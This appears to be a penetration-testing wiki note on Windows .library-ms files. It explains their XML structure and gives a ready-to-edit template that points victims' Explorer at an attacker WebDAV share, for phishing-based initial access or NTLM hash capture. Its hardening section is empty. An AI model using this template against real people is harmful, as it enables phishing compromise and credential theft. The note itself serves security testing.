---
tags:
  - "#type/tech-specific" 
  - "#attack/initial-access/client-side"
---
# Fundamentals

Windows `.library-ms`files:

- define a "Library" used by the windows explorer. Libraries are virtual collections of folders, such as "Documents", "Pictures", Music,...
- store metadata, such as the icon, included storage locations, etc.
- usually are stored in `%AppData%\Microsoft\Windows\Libraries`
- are often not detected by email filters
**Important:**
- Windows libraries can include remote locations using webdav or [[2 Tech-Specifics/Network/Protocols/TCP 445 SMB|SMB]]. --> they can serve as a 1st stage payload.
- Currently, explorer does not show if a remote location is included by a library.

Windows library files use [[2 Tech-Specifics/_Other/File Formats/XML|XML]] format and consist of 3 main sections:

1. **General information**–Library name (DLL-based), version, pinning, and icon.
2. **Library properties**–Display template and folder type (via GUID).
3. **Library locations**–A list of _search connectors_ that point to local or remote storage locations (e.g., WebDAV). Each search connector can specify default save behavior and a remote URL via `<simpleLocation>`.
Further details: [Library Description Schema](https://learn.microsoft.com/en-us/windows/win32/shell/library-schema-entry)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription
	xmlns="http://schemas.microsoft.com/windows/2009/library">
	<!--Defined by Microsoft-->
	<name>@windows.storage.dll,-34582</name>
	<!--arbitrary-->
	<version>6</version>
	<!--Pins the library in the file explorer-->
	<isLibraryPinned>true</isLibraryPinned>
	<!-- Defines the icon. -1002 Documents folder icon, -1003 for the Pictures folder icon-->
	<iconReference>imageres.dll,-1003</iconReference>
	<templateInfo>
			<!--See https://learn.microsoft.com/en-us/windows/win32/shell/schema-library-foldertype-->
		<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
	</templateInfo>
	<!--File location to browse-->
	<searchConnectorDescriptionList>
		<searchConnectorDescription>
			<isDefaultSaveLocation>true</isDefaultSaveLocation>
			<isSupported>false</isSupported>
			<simpleLocation>
				<!--location of a webdav share-->
				<url>http://192.168.x.x</url>
			</simpleLocation>
		</searchConnectorDescription>
	</searchConnectorDescriptionList>
</libraryDescription>
```

# Pentesting

## Initial Access

**Workflow:**

1. Send a `.library-ms` that includes to a remote location.
2. One of the following options:
	- On the attacker machine, host a webdav server that provides a malicious file that enables client side [[1 Methods/Security-Testing/4 Execution/Overview - 4 Execution|Execution]]. - E.g. this could be a scirpt, installer or malicious shortcut file - also see [[2 Tech-Specifics/OS/Windows/Client-side Execution|Client-side Execution]]
	- OR: When using smb, it might be possible to [[2 Tech-Specifics/OS/Windows/Credential Access/NTLMv2 Response Capture|capture the targets NTLM hash]].

#### 1. Set up a Local Webdav Server

Tools:

- [[3 Tools/network/WsgiDAV|WsgiDAV]]

#### 2. Create Library File

Good default snippet - just change the IP address:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription
	xmlns="http://schemas.microsoft.com/windows/2009/library">
	<name>@windows.storage.dll,-34582</name>
	<version>6</version>
	<isLibraryPinned>true</isLibraryPinned>
	<iconReference>imageres.dll,-1003</iconReference>
	<templateInfo>
		<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
	</templateInfo>
	<searchConnectorDescriptionList>
		<searchConnectorDescription>
			<isDefaultSaveLocation>true</isDefaultSaveLocation>
			<isSupported>false</isSupported>
			<simpleLocation>
				<url>http://192.168.x.x</url>
			</simpleLocation>
		</searchConnectorDescription>
	</searchConnectorDescriptionList>
</libraryDescription>
```

#### 3. Deliver the Library File

e.g. use [[2 Tech-Specifics/People/Phishing|Phishing]]

> [!HINT]
> Windows modifies library files on use. Make sure to always deliver a fresh library file to a new target.

# Hardening
